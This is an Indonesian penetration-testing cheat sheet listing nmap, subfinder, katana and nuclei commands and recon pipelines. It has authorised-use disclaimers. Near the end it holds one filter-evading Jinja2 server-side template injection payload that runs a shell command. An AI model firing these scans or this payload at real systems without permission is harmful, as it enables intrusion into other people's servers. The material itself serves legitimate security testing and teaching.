
# 🔍 Panduan Tools Enumerasi Penetration Testing

> **Disclaimer:** Tools ini hanya boleh digunakan pada sistem yang Anda miliki atau telah mendapat izin tertulis untuk ditest. Penggunaan tanpa izin melanggar UU ITE dan hukum siber yang berlaku.

---

## 📋 Daftar Isi
- [Nmap](#nmap)
- [Subfinder](#subfinder)
- [Katana](#katana)
- [Nuclei](#nuclei)
- [Kombinasi Workflow](#kombinasi-workflow)

---

## 🔴 Nmap

Network mapper untuk port scanning dan service detection.

### Instalasi
```bash
sudo apt install nmap -y
```

### Command Dasar
```bash
# Scan port umum
nmap 192.168.1.1

# Scan semua port (1-65535)
nmap -p- 192.168.1.1

# Scan port spesifik
nmap -p 22,80,443,8080 192.168.1.1

# Scan range port
nmap -p 1-1000 192.168.1.1
```

### Service & Version Detection
```bash
# Detect versi service
nmap -sV 192.168.1.1

# Detect OS
nmap -O 192.168.1.1

# Gabungan service + OS detection
nmap -sV -O 192.168.1.1

# Aggressive scan (OS, version, script, traceroute)
nmap -A 192.168.1.1
```

### Scan Types
```bash
# TCP SYN scan (default, butuh root)
nmap -sS 192.168.1.1

# TCP Connect scan (tanpa root)
nmap -sT 192.168.1.1

# UDP scan
nmap -sU 192.168.1.1

# Scan tanpa ping (skip host discovery)
nmap -Pn 192.168.1.1
```

### NSE Scripts
```bash
# Gunakan default scripts
nmap -sC 192.168.1.1

# Script kategori tertentu
nmap --script vuln 192.168.1.1
nmap --script http-enum 192.168.1.1
nmap --script ssl-cert 192.168.1.1

# Gabungan script + version
nmap -sV -sC 192.168.1.1
```

### Output
```bash
# Simpan ke file teks
nmap -oN hasil.txt 192.168.1.1

# Simpan ke XML
nmap -oX hasil.xml 192.168.1.1

# Simpan semua format
nmap -oA hasil 192.168.1.1
```

### Tips Praktis
```bash
# Scan cepat top 1000 port
nmap -T4 -F 192.168.1.1

# Scan subnet
nmap -sV 192.168.1.0/24

# Scan dari file list
nmap -iL targets.txt

# Verbose output
nmap -v -sV 192.168.1.1
```

---

## 🌐 Subfinder

Passive subdomain discovery dari berbagai sumber publik.

### Instalasi
```bash
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
```

### Command Dasar
```bash
# Subdomain discovery dasar
subfinder -d target.com

# Silent mode (output bersih)
subfinder -d target.com -silent

# Simpan ke file
subfinder -d target.com -o subdomains.txt
```

### Advanced Options
```bash
# Gunakan semua sources
subfinder -d target.com -all

# Tambah resolvers
subfinder -d target.com -r 8.8.8.8,1.1.1.1

# Thread lebih banyak (lebih cepat)
subfinder -d target.com -t 100

# Timeout per source
subfinder -d target.com -timeout 30

# Multiple domain sekaligus
subfinder -dL domains.txt -o results.txt
```

### Filter & Output
```bash
# Output JSON
subfinder -d target.com -json -o output.json

# Verbose (lihat source per subdomain)
subfinder -d target.com -v

# Filter berdasarkan source tertentu
subfinder -d target.com -sources shodan,censys,virustotal
```

### Konfigurasi API Keys
```bash
# Lokasi config
~/.config/subfinder/provider-config.yaml

# Contoh isi config
# virustotal:
#   - YOUR_API_KEY
# shodan:
#   - YOUR_API_KEY
```

---

## 🕷️ Katana

Web crawler cepat untuk crawling dan endpoint discovery.

### Instalasi
```bash
go install github.com/projectdiscovery/katana/cmd/katana@latest
```

### Command Dasar
```bash
# Crawl URL dasar
katana -u https://target.com

# Simpan output
katana -u https://target.com -o endpoints.txt

# Silent mode
katana -u https://target.com -silent
```

### Depth & Scope
```bash
# Set kedalaman crawl
katana -u https://target.com -d 3

# Crawl dalam scope domain saja
katana -u https://target.com -cs target.com

# Maksimal pages
katana -u https://target.com -c 100
```

### Mode Crawling
```bash
# Standard mode (HTTP)
katana -u https://target.com

# Headless mode (JavaScript rendering)
katana -u https://target.com -headless

# Mode hybrid (HTTP + JS)
katana -u https://target.com -hybrid
```

### Filter & Extension
```bash
# Filter ekstensi tertentu
katana -u https://target.com -em js,php,json

# Exclude ekstensi
katana -u https://target.com -ef png,jpg,gif,css

# Filter berdasarkan kata kunci
katana -u https://target.com -mr "api|login|admin"
```

### Advanced
```bash
# Tambah headers
katana -u https://target.com -H "Authorization: Bearer TOKEN"

# Gunakan proxy
katana -u https://target.com -proxy http://127.0.0.1:8080

# Multiple URLs dari file
katana -list urls.txt -d 2 -o all_endpoints.txt

# Concurrency
katana -u https://target.com -c 20 -p 10
```

---

## ☢️ Nuclei

Vulnerability scanner berbasis template yang cepat dan powerful.

### Instalasi
```bash
go install -v github.com/projectdiscovery/nuclei/cmd/nuclei@latest

# Update templates
nuclei -update-templates
```

### Command Dasar
```bash
# Scan URL tunggal
nuclei -u https://target.com

# Scan dari file list
nuclei -l targets.txt

# Simpan hasil
nuclei -u https://target.com -o hasil.txt
```

### Filter Template
```bash
# Berdasarkan tags
nuclei -u https://target.com -tags cve
nuclei -u https://target.com -tags sqli,xss
nuclei -u https://target.com -tags laravel,php

# Berdasarkan severity
nuclei -u https://target.com -severity critical,high
nuclei -u https://target.com -severity medium,high,critical

# Gabungan tags + severity
nuclei -u https://target.com -tags cve -severity high,critical
```

### Template Spesifik
```bash
# Gunakan template tertentu
nuclei -u https://target.com -t cves/2021/CVE-2021-44228.yaml

# Gunakan folder template
nuclei -u https://target.com -t ~/nuclei-templates/cves/

# Exclude template tertentu
nuclei -u https://target.com -etags dos,fuzz
```

### Kategori Template Umum
```bash
# CVE scan
nuclei -u https://target.com -tags cve -severity high,critical

# Exposure / file sensitif
nuclei -u https://target.com -tags exposure

# Misconfiguration
nuclei -u https://target.com -tags misconfig

# Default credentials
nuclei -u https://target.com -tags default-login

# Teknologi detection
nuclei -u https://target.com -tags tech
```

### Advanced Options
```bash
# Custom headers
nuclei -u https://target.com -H "Cookie: session=abc123"

# Rate limiting
nuclei -u https://target.com -rl 100 -c 25

# Timeout
nuclei -u https://target.com -timeout 10

# Proxy
nuclei -u https://target.com -proxy http://127.0.0.1:8080

# Verbose
nuclei -u https://target.com -v

# Output JSON
nuclei -u https://target.com -json -o hasil.json
```

---

## ⚡ Kombinasi Workflow

### Workflow 1: Full Subdomain + Live Check
```bash
# 1. Temukan subdomain
subfinder -d target.com -silent -o subs.txt

# 2. Cek yang aktif + ambil IP
cat subs.txt | dnsx -a -resp -silent -o live_subs.txt

# 3. Probe HTTP/HTTPS
cat subs.txt | httpx -status-code -title -tech-detect -cdn -ip -o live_http.txt
```

### Workflow 2: Crawl + Scan Endpoint
```bash
# 1. Crawl semua endpoint
katana -u https://target.com -d 3 -silent -o endpoints.txt

# 2. Probe endpoint yang ditemukan
cat endpoints.txt | httpx -status-code -o live_endpoints.txt

# 3. Scan vulnerability di endpoint
nuclei -l live_endpoints.txt -tags xss,sqli,lfi -severity medium,high,critical
```

### Workflow 3: Full Recon Pipeline
```bash
# One-liner: subdomain → probe → scan
subfinder -d target.com -silent | \
  httpx -silent | \
  nuclei -tags cve,exposure,misconfig -severity high,critical -o hasil_full.txt
```

### Workflow 4: Targeted Tech Scan
```bash
# Identifikasi teknologi dulu
nuclei -u https://target.com -tags tech -o tech.txt

# Lalu scan berdasarkan teknologi yang ditemukan
# Misal terdeteksi Laravel:
nuclei -u https://target.com -tags laravel,php -severity medium,high,critical
```

---

## 📦 Instalasi Semua Tools Sekaligus

```bash
# Pastikan Go terinstall
sudo apt install golang-go -y

# Install semua tools
go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
go install -v github.com/projectdiscovery/katana/cmd/katana@latest
go install -v github.com/projectdiscovery/nuclei/cmd/nuclei@latest
go install -v github.com/projectdiscovery/naabu/v2/cmd/naabu@latest

# Tambah ke PATH
echo 'export PATH=$PATH:$(go env GOPATH)/bin' >> ~/.bashrc
source ~/.bashrc

# Update nuclei templates
nuclei -update-templates
```

---


# All-Payload


##SSTI

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}



## 📚 Referensi

- [ProjectDiscovery Docs](https://docs.projectdiscovery.io)
- [Nuclei Templates](https://github.com/projectdiscovery/nuclei-templates)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)

---

> ⚠️ Gunakan tools ini secara **legal dan etis** — hanya pada sistem yang Anda miliki izin untuk ditest.
